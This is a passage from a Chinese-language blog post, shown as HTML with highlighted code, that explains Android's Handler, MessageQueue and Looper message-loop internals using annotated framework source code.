Handler#enqueueMessage()</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">enqueueMessage</span><span class="params">(<span class="meta">@NonNull</span> MessageQueue queue, <span class="meta">@NonNull</span> Message msg,</span></span><br><span class="line"><span class="params">            <span class="type">long</span> uptimeMillis)</span> &#123;</span><br><span class="line">        <span class="comment">// 把当前对象赋给msg.target，这样 Message 就持有了 Handler</span></span><br><span class="line">        msg.target = <span class="built_in">this</span>;</span><br><span class="line">        msg.workSourceUid = ThreadLocalWorkSource.getUid();</span><br><span class="line">        <span class="keyword">if</span> (mAsynchronous) &#123;</span><br><span class="line">            msg.setAsynchronous(<span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 调用 MessageQueue#enqueueMessage() 往消息队列添加消息。</span></span><br><span class="line">        <span class="keyword">return</span> queue.enqueueMessage(msg, uptimeMillis);</span><br><span class="line">    &#125;</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="MessageQueue"><a href="#MessageQueue" class="headerlink" title="MessageQueue"></a>MessageQueue</h4><p>enqueueMessage 里面其实是一个优先级队列，将收到消息根据执行的时间 when 进行做排序处理。<br><strong>frameworks/base/core/java/android/os/MessageQueue.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">MessageQueue</span> &#123;</span><br><span class="line">    ......</span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">enqueueMessage</span><span class="params">(Message msg, <span class="type">long</span> when)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (msg.target == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Message must have a target.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">synchronized</span> (<span class="built_in">this</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (msg.isInUse()) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(msg + <span class="string">&quot; This message is already in use.&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (mQuitting) &#123;</span><br><span class="line">                <span class="type">IllegalStateException</span> <span class="variable">e</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(</span><br><span class="line">                        msg.target + <span class="string">&quot; sending message to a Handler on a dead thread&quot;</span>);</span><br><span class="line">                Log.w(TAG, e.getMessage(), e);</span><br><span class="line">                msg.recycle();</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            msg.markInUse();</span><br><span class="line">            msg.when = when;</span><br><span class="line">            <span class="type">Message</span> <span class="variable">p</span> <span class="operator">=</span> mMessages;</span><br><span class="line">            <span class="type">boolean</span> needWake;</span><br><span class="line">            <span class="comment">// 如果是0，则放在最前面</span></span><br><span class="line">            <span class="keyword">if</span> (p == <span class="literal">null</span> || when == <span class="number">0</span> || when &lt; p.when) &#123;</span><br><span class="line">                <span class="comment">// New head, wake up the event queue if blocked.</span></span><br><span class="line">                msg.next = p;</span><br><span class="line">                mMessages = msg;</span><br><span class="line">                needWake = mBlocked;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// Inserted within the middle of the queue.  Usually we don&#x27;t have to wake</span></span><br><span class="line">                <span class="comment">// up the event queue unless there is a barrier at the head of the queue</span></span><br><span class="line">                <span class="comment">// and the message is the earliest asynchronous message in the queue.</span></span><br><span class="line">                needWake = mBlocked &amp;&amp; p.target == <span class="literal">null</span> &amp;&amp; msg.isAsynchronous();</span><br><span class="line">                Message prev;</span><br><span class="line">                <span class="comment">// 对单链表轮询，根据 when 进行排序插入消息。</span></span><br><span class="line">                <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">                    prev = p;</span><br><span class="line">                    p = p.next;</span><br><span class="line">                    <span class="keyword">if</span> (p == <span class="literal">null</span> || when &lt; p.when) &#123;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> (needWake &amp;&amp; p.isAsynchronous()) &#123;</span><br><span class="line">                        needWake = <span class="literal">false</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                msg.next = p; <span class="comment">// invariant: p == prev.next</span></span><br><span class="line">                prev.next = msg;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// We can assume mPtr != 0 because mQuitting is false.</span></span><br><span class="line">            <span class="keyword">if</span> (needWake) &#123;</span><br><span class="line">                nativeWake(mPtr);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>到这里发消息基本完成，后面看如何取消息。<br>next() 中返回一个 Message。<br><strong>frameworks/base/core/java/android/os/MessageQueue.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">MessageQueue</span> &#123;</span><br><span class="line">    ......</span><br><span class="line">    Message <span class="title function_">next</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// Return here if the message loop has already quit and been disposed.</span></span><br><span class="line">        <span class="comment">// This can happen if the application tries to restart a looper after quit</span></span><br><span class="line">        <span class="comment">// which is not supported.</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">long</span> <span class="variable">ptr</span> <span class="operator">=</span> mPtr;</span><br><span class="line">        <span class="keyword">if</span> (ptr == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">pendingIdleHandlerCount</span> <span class="operator">=</span> -<span class="number">1</span>; <span class="comment">// -1 only during first iteration</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">nextPollTimeoutMillis</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (;;) &#123;  <span class="comment">// 死循环，</span></span><br><span class="line">            <span class="keyword">if</span> (nextPollTimeoutMillis != <span class="number">0</span>) &#123;</span><br><span class="line">                Binder.flushPendingCommands();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// nextPollTimeoutMillis ：-1 表示无限等待，直到有事件为止；0 表示立即执行；其他数字表示等待多时毫秒。</span></span><br><span class="line">            <span class="comment">// linux 层休眠等待，</span></span><br><span class="line">            nativePollOnce(ptr, nextPollTimeoutMillis);</span><br><span class="line">            <span class="keyword">synchronized</span> (<span class="built_in">this</span>) &#123;</span><br><span class="line">                <span class="comment">// Try to retrieve the next message.  Return if found.</span></span><br><span class="line">                <span class="keyword">final</span> <span class="type">long</span> <span class="variable">now</span> <span class="operator">=</span> SystemClock.uptimeMillis();</span><br><span class="line">                <span class="type">Message</span> <span class="variable">prevMsg</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">                <span class="comment">// 拿到队列对头消息</span></span><br><span class="line">                <span class="type">Message</span> <span class="variable">msg</span> <span class="operator">=</span> mMessages;</span><br><span class="line">                <span class="keyword">if</span> (msg != <span class="literal">null</span> &amp;&amp; msg.target == <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="comment">// Stalled by a barrier.  Find the next asynchronous message in the queue.</span></span><br><span class="line">                    <span class="keyword">do</span> &#123;</span><br><span class="line">                        prevMsg = msg;</span><br><span class="line">                        msg = msg.next;</span><br><span class="line">                    &#125; <span class="keyword">while</span> (msg != <span class="literal">null</span> &amp;&amp; !msg.isAsynchronous());</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (msg != <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="comment">// 跟当前时间对比</span></span><br><span class="line">                    <span class="keyword">if</span> (now &lt; msg.when) &#123;</span><br><span class="line">                        <span class="comment">// 队列中，第一个节点还没到可以执行的时刻，则等待。</span></span><br><span class="line">                        <span class="comment">// Next message is not ready.  Set a timeout to wake up when it is ready.</span></span><br><span class="line">                        nextPollTimeoutMillis = (<span class="type">int</span>) Math.min(msg.when - now, Integer.MAX_VALUE);</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;  <span class="comment">// 到了可以执行的时间，则把消息 return 出去。</span></span><br><span class="line">                        <span class="comment">// Got a message.</span></span><br><span class="line">                        mBlocked = <span class="literal">false</span>;</span><br><span class="line">                        <span class="keyword">if</span> (prevMsg != <span class="literal">null</span>) &#123;</span><br><span class="line">                            prevMsg.next = msg.next;</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            mMessages = msg.next;</span><br><span class="line">                        &#125;</span><br><span class="line">                        msg.next = <span class="literal">null</span>;</span><br><span class="line">                        <span class="keyword">if</span> (DEBUG) Log.v(TAG, <span class="string">&quot;Returning message: &quot;</span> + msg);</span><br><span class="line">                        msg.markInUse();</span><br><span class="line">                        <span class="keyword">return</span> msg;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="comment">// No more messages.</span></span><br><span class="line">                    nextPollTimeoutMillis = -<span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// Process the quit message now that all pending messages have been handled.</span></span><br><span class="line">                <span class="keyword">if</span> (mQuitting) &#123;</span><br><span class="line">                    dispose();</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// If first time idle, then get the number of idlers to run.</span></span><br><span class="line">                <span class="comment">// Idle handles only run if the queue is empty or if the first message</span></span><br><span class="line">                <span class="comment">// in the queue (possibly a barrier) is due to be handled in the future.</span></span><br><span class="line">                <span class="keyword">if</span> (pendingIdleHandlerCount &lt; <span class="number">0</span></span><br><span class="line">                        &amp;&amp; (mMessages == <span class="literal">null</span> || now &lt; mMessages.when)) &#123;</span><br><span class="line">                    pendingIdleHandlerCount = mIdleHandlers.size();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (pendingIdleHandlerCount &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="comment">// No idle handlers to run.  Loop and wait some more.</span></span><br><span class="line">                    mBlocked = <span class="literal">true</span>;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (mPendingIdleHandlers == <span class="literal">null</span>) &#123;</span><br><span class="line">                    mPendingIdleHandlers = <span class="keyword">new</span> <span class="title class_">IdleHandler</span>[Math.max(pendingIdleHandlerCount, <span class="number">4</span>)];</span><br><span class="line">                &#125;</span><br><span class="line">                mPendingIdleHandlers = mIdleHandlers.toArray(mPendingIdleHandlers);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// Run the idle handlers.</span></span><br><span class="line">            <span class="comment">// We only ever reach this code block during the first iteration.</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; pendingIdleHandlerCount; i++) &#123;</span><br><span class="line">                <span class="keyword">final</span> <span class="type">IdleHandler</span> <span class="variable">idler</span> <span class="operator">=</span> mPendingIdleHandlers[i];</span><br><span class="line">                mPendingIdleHandlers[i] = <span class="literal">null</span>; <span class="comment">// release the reference to the handler</span></span><br><span class="line">                <span class="type">boolean</span> <span class="variable">keep</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    keep = idler.queueIdle();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Throwable t) &#123;</span><br><span class="line">                    Log.wtf(TAG, <span class="string">&quot;IdleHandler threw exception&quot;</span>, t);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (!keep) &#123;</span><br><span class="line">                    <span class="keyword">synchronized</span> (<span class="built_in">this</span>) &#123;</span><br><span class="line">                        mIdleHandlers.remove(idler);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// Reset the idle handler count to 0 so we do not run them again.</span></span><br><span class="line">            pendingIdleHandlerCount = <span class="number">0</span>;</span><br><span class="line">            <span class="comment">// While calling an idle handler, a new message could have been delivered</span></span><br><span class="line">            <span class="comment">// so go back and look again for a pending message without waiting.</span></span><br><span class="line">            nextPollTimeoutMillis = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>到此，消息取出来了，但是谁取的呢？这就涉及到另一个重要的类 Looper</p><h4 id="Looper"><a href="#Looper" class="headerlink" title="Looper"></a>Looper</h4><p>Looper.loop() 里面会有个for循环，且是个死循环，会不断的调用 MessageQueue#next() 方法。<br><strong>frameworks/base/core/java/android/os/Looper.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">Looper</span> &#123;</span><br><span class="line">    ......</span><br><span class="line">     <span class="comment">// 初始化Looper </span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">prepare</span><span class="params">()</span> &#123;</span><br><span class="line">        prepare(<span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">prepare</span><span class="params">(<span class="type">boolean</span> quitAllowed)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (sThreadLocal.get() != <span class="literal">null</span>) &#123;  <span class="comment">// 如果该线程有 Looper，则抛出一个异常。</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;Only one Looper may be created per thread&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 这里使用了 ThreadLocal，保证了一个线程只有一个Looper。</span></span><br><span class="line">        sThreadLocal.set(<span class="keyword">new</span> <span class="title class_">Looper</span>(quitAllowed));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">loop</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Looper</span> <span class="variable">me</span> <span class="operator">=</span> myLooper();</span><br><span class="line">        <span class="keyword">if</span> (me == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;No Looper; Looper.prepare() wasn&#x27;t called on this thread.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (me.mInLoop) &#123;</span><br><span class="line">            Slog.w(TAG, <span class="string">&quot;Loop again would have the queued messages be executed&quot;</span></span><br><span class="line">                    + <span class="string">&quot; before this one completed.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        me.mInLoop = <span class="literal">true</span>;</span><br><span class="line">        <span class="comment">// Make sure the identity of this thread is that of the local process,</span></span><br><span class="line">        <span class="comment">// and keep track of what that identity token actually is.</span></span><br><span class="line">        Binder.clearCallingIdentity();</span><br><span class="line">        <span class="keyword">final</span> <span class="type">long</span> <span class="variable">ident</span> <span class="operator">=</span> Binder.clearCallingIdentity();</span><br><span class="line">        <span class="comment">// Allow overriding a threshold with a system prop. e.g.</span></span><br><span class="line">        <span class="comment">// adb shell &#x27;setprop log.looper.1000.main.slow 1 &amp;&amp; stop &amp;&amp; start&#x27;</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">int</span> <span class="variable">thresholdOverride</span> <span class="operator">=</span></span><br><span class="line">                SystemProperties.getInt(<span class="string">&quot;log.looper.&quot;</span></span><br><span class="line">                        + Process.myUid() + <span class="string">&quot;.&quot;</span></span><br><span class="line">                        + Thread.currentThread().getName()</span><br><span class="line">                        + <span class="string">&quot;.slow&quot;</span>, <span class="number">0</span>);</span><br><span class="line">        me.mSlowDeliveryDetected = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">for</span> (;;) &#123;  <span class="comment">// 死循环</span></span><br><span class="line">            <span class="comment">// 不断地调用mQueue.next()</span></span><br><span class="line">            <span class="keyword">if</span> (!loopOnce(me, ident, thresholdOverride)) &#123;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">loopOnce</span><span class="params">(<span class="keyword">final</span> Looper me,</span></span><br><span class="line"><span class="params">            <span class="keyword">final</span> <span class="type">long</span> ident, <span class="keyword">final</span> <span class="type">int</span> thresholdOverride)</span> &#123;</span><br><span class="line">        <span class="comment">// 这里如果此时队列中没有消息或队列中，第一个节点还没到可以执行的时刻，则会进入等待，block 状态。</span></span><br><span class="line">        <span class="comment">// 会一直在这等，该等待是Linux层做的，在 mQueue.next()中</span></span><br><span class="line">        <span class="type">Message</span> <span class="variable">msg</span> <span class="operator">=</span> me.mQueue.next(); <span class="comment">// might block</span></span><br><span class="line">        <span class="keyword">if</span> (msg == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// No message indicates that the message queue is quitting.</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// This must be in a local variable, in case a UI event sets the logger</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">Printer</span> <span class="variable">logging</span> <span class="operator">=</span> me.mLogging;</span><br><span class="line">        <span class="comment">// Make sure the observer won&#x27;t change while processing a transaction.</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">Observer</span> <span class="variable">observer</span> <span class="operator">=</span> sObserver;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">long</span> <span class="variable">traceTag</span> <span class="operator">=</span> me.mTraceTag;</span><br><span class="line">        <span class="type">long</span> <span class="variable">slowDispatchThresholdMs</span> <span class="operator">=</span> me.mSlowDispatchThresholdMs;</span><br><span class="line">        <span class="type">long</span> <span class="variable">slowDeliveryThresholdMs</span> <span class="operator">=</span> me.mSlowDeliveryThresholdMs;</span><br><span class="line">        <span class="keyword">if</span> (thresholdOverride &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            slowDispatchThresholdMs = thresholdOverride;</span><br><span class="line">            slowDeliveryThresholdMs = thresholdOverride;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">boolean</span> <span class="variable">logSlowDelivery</span> <span class="operator">=</span> (slowDeliveryThresholdMs &gt; <span class="number">0</span>) &amp;&amp; (msg.when &gt; <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">final</span> <span class="type">boolean</span> <span class="variable">logSlowDispatch</span> <span class="operator">=</span> (slowDispatchThresholdMs &gt; <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">final</span> <span class="type">boolean</span> <span class="variable">needStartTime</span> <span class="operator">=</span> logSlowDelivery || logSlowDispatch;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">boolean</span> <span class="variable">needEndTime</span> <span class="operator">=</span> logSlowDispatch;</span><br><span class="line">        <span class="keyword">if</span> (traceTag != <span class="number">0</span> &amp;&amp; Trace.isTagEnabled(traceTag)) &#123;</span><br><span class="line">            Trace.traceBegin(traceTag, msg.target.getTraceName(msg));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">long</span> <span class="variable">dispatchStart</span> <span class="operator">=</span> needStartTime ? SystemClock.uptimeMillis() : <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">long</span> dispatchEnd;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">token</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">if</span> (observer != <span class="literal">null</span>) &#123;</span><br><span class="line">            token = observer.messageDispatchStarting();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">long</span> <span class="variable">origWorkSource</span> <span class="operator">=</span> ThreadLocalWorkSource.setUid(msg.workSourceUid);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 获取到消息后，就会调用 msg.target.dispatchMessage(msg)，即回调 handler#dispatchMessage(msg)</span></span><br><span class="line">            <span class="comment">// msg.target 为 handler对象</span></span><br><span class="line">            msg.target.dispatchMessage(msg);</span><br><span class="line">            <span class="keyword">if</span> (observer != <span class="literal">null</span>) &#123;</span><br><span class="line">                observer.messageDispatched(token, msg);</span><br><span class="line">            &#125;</span><br><span class="line">            dispatchEnd = needEndTime ? SystemClock.uptimeMillis() : <span class="number">0</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception exception) &#123;</span><br><span class="line">            <span class="keyword">if</span> (observer != <span class="literal">null</span>) &#123;</span><br><span class="line">                observer.dispatchingThrewException(token, msg, exception);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">throw</span> exception;</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            ThreadLocalWorkSource.restore(origWorkSource);</span><br><span class="line">            <span class="keyword">if</span> (traceTag != <span class="number">0</span>) &#123;</span><br><span class="line">                Trace.traceEnd(traceTag);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (logSlowDelivery) &#123;</span><br><span class="line">            <span class="keyword">if</span> (me.mSlowDeliveryDetected) &#123;</span><br><span class="line">                <span class="keyword">if</span> ((dispatchStart - msg.when) &lt;= <span class="number">10</span>) &#123;</span><br><span class="line">                    Slog.w(TAG, <span class="string">&quot;Drained&quot;</span>);</span><br><span class="line">                    me.mSlowDeliveryDetected = <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (showSlowLog(slowDeliveryThresholdMs, msg.when, dispatchStart, <span class="string">&quot;delivery&quot;</span>,</span><br><span class="line">                        msg)) &#123;</span><br><span class="line">                    <span class="comment">// Once we write a slow delivery log, suppress until the queue drains.</span></span><br><span class="line">                    me.mSlowDeliveryDetected = <span class="literal">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (logSlowDispatch) &#123;</span><br><span class="line">            showSlowLog(slowDispatchThresholdMs, dispatchStart, dispatchEnd, <span class="string">&quot;dispatch&quot;</span>, msg);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (logging != <span class="literal">null</span>) &#123;</span><br><span class="line">            logging.println(<span class="string">&quot;&lt;&lt;&lt;&lt;&lt; Finished to 